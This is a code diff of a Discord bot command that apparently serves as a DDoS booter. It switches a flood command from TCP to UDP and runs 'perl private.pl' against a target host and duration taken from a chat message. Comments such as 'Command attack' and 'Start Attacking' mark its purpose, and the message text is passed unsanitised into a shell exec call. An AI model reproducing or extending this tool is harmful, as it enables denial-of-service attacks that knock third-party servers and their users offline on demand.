@@ -6,9 +6,8 @@ const libquery = require("libquery");
 exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
-const port = message.content.split (" ")[2]
-const time = message.content.split (" ")[3]
-const api = message.content.split (" ")[4]
+const time = message.content.split (" ")[2]
+const api = message.content.split (" ")[3]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -33,7 +32,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`contoh ;TCP target PORT TIME api`")
+	.setDescription("`contoh ;udp target TIME api`")
 	.setFooter("GUNAKAN DENGAN BIJAK OKH!!!")
 	message.channel.send(embed1);
 	return;
@@ -69,7 +68,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`./AUTOBYPASS TCP ${host} ${port} ${time}`, (error, stdout, stderr) => {
+exec(`perl private.pl ${host} ${time}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -114,12 +113,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['TCP'],
+  aliases: ['UDP'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'TCP',
+  name: 'UDP',
   description: 'YUKAI',
-  usage: 'TCP'
+  usage: 'UDP'
 }
